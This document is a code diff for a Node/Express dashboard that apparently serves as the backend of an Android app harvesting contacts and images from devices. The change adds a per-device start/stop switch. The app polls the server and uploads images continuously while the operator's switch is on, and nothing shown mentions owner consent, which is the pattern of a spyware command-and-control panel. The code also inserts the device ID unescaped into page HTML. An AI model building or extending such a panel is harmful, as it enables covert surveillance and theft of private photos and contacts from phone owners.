@@ -41,6 +41,11 @@ async function initDB() {
       device_id TEXT,
       contact TEXT
     );
+
+    CREATE TABLE IF NOT EXISTS device_control (
+      device_id TEXT PRIMARY KEY,
+      uploading BOOLEAN DEFAULT FALSE
+    );
   `);
 }
 initDB();
@@ -124,21 +129,6 @@ const sharedStyles = `
     }
     .stat-label { font-size: 13px; color: #64748b; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
     .stat-value { font-size: 42px; font-weight: 700; color: #f1f5f9; line-height: 1; }
-    .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
-    .form-group { display: flex; flex-direction: column; gap: 6px; }
-    .form-group label { font-size: 12px; color: #64748b; text-transform: uppercase; letter-spacing: 0.6px; }
-    input[type="number"] {
-      background: #131f38;
-      border: 1px solid #1e2d4a;
-      color: #e2e8f0;
-      padding: 10px 14px;
-      border-radius: 8px;
-      font-size: 14px;
-      width: 110px;
-      outline: none;
-      transition: border 0.2s;
-    }
-    input[type="number"]:focus { border-color: #22c55e; }
     .btn {
       padding: 10px 20px;
       border-radius: 8px;
@@ -160,8 +150,13 @@ const sharedStyles = `
     .btn-blue:hover { background: #1e40af; }
     .btn-green { background: #15803d; color: #f0fdf4; }
     .btn-green:hover { background: #166534; }
+    .btn-red { background: #dc2626; color: #fff; }
+    .btn-red:hover { background: #b91c1c; }
+    .btn-start { background: #22c55e; color: #052e16; padding: 12px 28px; font-size: 15px; border-radius: 10px; }
+    .btn-start:hover { background: #16a34a; }
+    .btn-stop { background: #dc2626; color: #fff; padding: 12px 28px; font-size: 15px; border-radius: 10px; }
+    .btn-stop:hover { background: #b91c1c; }
 
-    /* Users list */
     .user-list { display: flex; flex-direction: column; gap: 12px; }
     .user-row {
       background: #0d1526;
@@ -186,7 +181,6 @@ const sharedStyles = `
     .user-id { font-size: 14px; font-weight: 500; color: #cbd5e1; flex: 1; word-break: break-all; }
     .user-actions { display: flex; gap: 10px; flex-shrink: 0; }
 
-    /* Images grid */
     .images-grid {
       display: grid;
       grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
@@ -208,7 +202,6 @@ const sharedStyles = `
     .img-wrapper:hover img { transform: scale(1.06); }
     .empty-state { padding: 28px; text-align: center; color: #334155; font-size: 14px; }
 
-    /* Contacts table */
     .contacts-table { width: 100%; border-collapse: collapse; }
     .contacts-table th {
       text-align: left;
@@ -239,6 +232,37 @@ const sharedStyles = `
       border: 1px solid #22c55e33;
       margin-left: 6px;
     }
+    .status-badge-on {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 4px 12px; border-radius: 20px;
+      font-size: 12px; font-weight: 600;
+      background: #22c55e22; color: #22c55e;
+      border: 1px solid #22c55e44;
+    }
+    .status-badge-off {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 4px 12px; border-radius: 20px;
+      font-size: 12px; font-weight: 600;
+      background: #dc262622; color: #f87171;
+      border: 1px solid #dc262644;
+    }
+    .pulse { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; animation: pulse 1.5s infinite; }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; } 50% { opacity: 0.3; }
+    }
+    .dot-off { width: 7px; height: 7px; border-radius: 50%; background: #f87171; }
+
+    .control-box {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 20px 24px;
+      background: #0a1628;
+      border-radius: 12px;
+      border: 1px solid #1e2d4a;
+      margin-bottom: 20px;
+    }
+    .control-label { font-size: 14px; color: #94a3b8; flex: 1; }
   </style>
 `;
 
@@ -255,17 +279,37 @@ function topbar() {
   `;
 }
 
-// ================= CONTROL CONFIG =================
-let config = { limit: 5, offset: 0 };
-
-app.get("/config/:device_id", (req, res) => {
-  res.json(config);
+// ================= CONFIG ENDPOINT (called by Android app) =================
+// Returns whether upload is active for this device
+app.get("/config/:device_id", async (req, res) => {
+  const device_id = req.params.device_id;
+  const result = await pool.query(
+    "SELECT uploading FROM device_control WHERE device_id=$1",
+    [device_id]
+  );
+  const uploading = result.rows.length > 0 ? result.rows[0].uploading : false;
+  res.json({ uploading });
 });
 
-app.post("/set-config", (req, res) => {
-  config.limit = parseInt(req.body.limit);
-  config.offset = parseInt(req.body.offset);
-  res.redirect("/user/" + req.body.device_id + "/images");
+// ================= START / STOP UPLOAD CONTROL =================
+app.post("/control/:device_id/start", async (req, res) => {
+  const { device_id } = req.params;
+  await pool.query(
+    `INSERT INTO device_control (device_id, uploading) VALUES ($1, TRUE)
+     ON CONFLICT (device_id) DO UPDATE SET uploading = TRUE`,
+    [device_id]
+  );
+  res.redirect("/user/" + device_id + "/images");
+});
+
+app.post("/control/:device_id/stop", async (req, res) => {
+  const { device_id } = req.params;
+  await pool.query(
+    `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
+     ON CONFLICT (device_id) DO UPDATE SET uploading = FALSE`,
+    [device_id]
+  );
+  res.redirect("/user/" + device_id + "/images");
 });
 
 // ================= DASHBOARD =================
@@ -383,7 +427,7 @@ app.get("/users", async (req, res) => {
   `);
 });
 
-// ================= USER CONTACTS (DEDUPLICATED) =================
+// ================= USER CONTACTS =================
 app.get("/user/:device_id/contacts", async (req, res) => {
   const device = req.params.device_id;
 
@@ -434,7 +478,7 @@ app.get("/user/:device_id/contacts", async (req, res) => {
   `);
 });
 
-// ================= USER IMAGES =================
+// ================= USER IMAGES (with Start/Stop) =================
 app.get("/user/:device_id/images", async (req, res) => {
   const device = req.params.device_id;
 
@@ -442,6 +486,12 @@ app.get("/user/:device_id/images", async (req, res) => {
     "SELECT * FROM images WHERE device_id=$1",
     [device]
   );
+
+  const controlRow = await pool.query(
+    "SELECT uploading FROM device_control WHERE device_id=$1",
+    [device]
+  );
+  const isUploading = controlRow.rows.length > 0 ? controlRow.rows[0].uploading : false;
 
   let imgGrid = "";
   images.rows.forEach(img => {
@@ -451,6 +501,10 @@ app.get("/user/:device_id/images", async (req, res) => {
       </div>
     `;
   });
+
+  const statusBadge = isUploading
+    ? `<span class="status-badge-on"><span class="pulse"></span> Uploading Active</span>`
+    : `<span class="status-badge-off"><span class="dot-off"></span> Stopped</span>`;
 
   res.send(`
   <html><head><title>Images - ${device}</title>${sharedStyles}</head>
@@ -462,21 +516,22 @@ app.get("/user/:device_id/images", async (req, res) => {
       <div class="page-subtitle" style="font-family:monospace;">${device}</div>
 
       <div class="card">
-        <h3>&#9881; Upload Configuration</h3>
-        <form method="POST" action="/set-config">
-          <input type="hidden" name="device_id" value="${device}"/>
-          <div class="form-row">
-            <div class="form-group">
-              <label>Limit</label>
-              <input type="number" name="limit" value="${config.limit}"/>
-            </div>
-            <div class="form-group">
-              <label>Offset</label>
-              <input type="number" name="offset" value="${config.offset}"/>
-            </div>
-            <button type="submit" class="btn btn-primary">&#10003; Update Config</button>
-          </div>
-        </form>
+        <h3>&#9881; Upload Control &nbsp; ${statusBadge}</h3>
+        <p style="font-size:13px; color:#64748b; margin-bottom:20px;">
+          Start to allow the device to upload images continuously. Stop to pause all uploads from this device.
+        </p>
+        <div style="display:flex; gap:14px;">
+          <form method="POST" action="/control/${device}/start">
+            <button type="submit" class="btn btn-start" ${isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
+              &#9654; Start Upload
+            </button>
+          </form>
+          <form method="POST" action="/control/${device}/stop">
+            <button type="submit" class="btn btn-stop" ${!isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
+              &#9632; Stop Upload
+            </button>
+          </form>
+        </div>
       </div>
 
       <div class="card">
